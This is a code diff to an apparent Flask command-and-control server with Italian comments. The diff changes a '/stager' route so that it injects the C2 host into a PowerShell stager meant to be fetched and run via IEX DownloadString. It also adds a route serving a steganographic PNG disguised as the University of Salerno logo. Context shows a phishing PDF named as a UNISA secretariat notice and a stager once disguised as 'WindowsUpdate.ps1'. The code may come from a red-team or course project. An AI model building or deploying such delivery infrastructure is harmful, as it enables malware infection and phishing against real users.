@@ -209,14 +209,15 @@ def payload_hta():
 
 @app.route('/stager')
 def serve_stager():
-    """Serve stager.ps1 grezzo — usato da IEX DownloadString() direttamente."""
+    """Serve stager.ps1 iniettando l'IP C2 a runtime."""
     stager_path = Path(__file__).parent.parent / 'client' / 'stager.ps1'
     if not stager_path.exists():
         return f"stager.ps1 not found at {stager_path}", 404
-    return send_file(str(stager_path),
-                     as_attachment=True,
-                     download_name='WindowsUpdate.ps1',
-                     mimetype='application/octet-stream')
+    content = stager_path.read_text()
+    host = request.host.split(':')[0]
+    content = re.sub(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', host, content)
+    from flask import Response
+    return Response(content, mimetype='text/plain')
 
 @app.route('/launcher')
 def serve_launcher():
@@ -274,7 +275,13 @@ def phishing_pdf():
     return send_file(str(pdf_path), as_attachment=True,
                      download_name='Comunicazione_Segreteria_UNISA.pdf',
                      mimetype='application/pdf')
-
+                     
+@app.route('/logo_unisa.png', methods=['GET'])
+def serve_stego():
+    stego_path = Path(__file__).parent / 'unisa_logo_stego.png'
+    if not stego_path.exists():
+        return "Not found — esegui prima: python3 server/genera_stego.py", 404
+    return send_file(str(stego_path), mimetype='image/png')
 # ══════════════════════════════════════════════════════════════════════
 # API PER LA DASHBOARD (invariate)
 # ══════════════════════════════════════════════════════════════════════
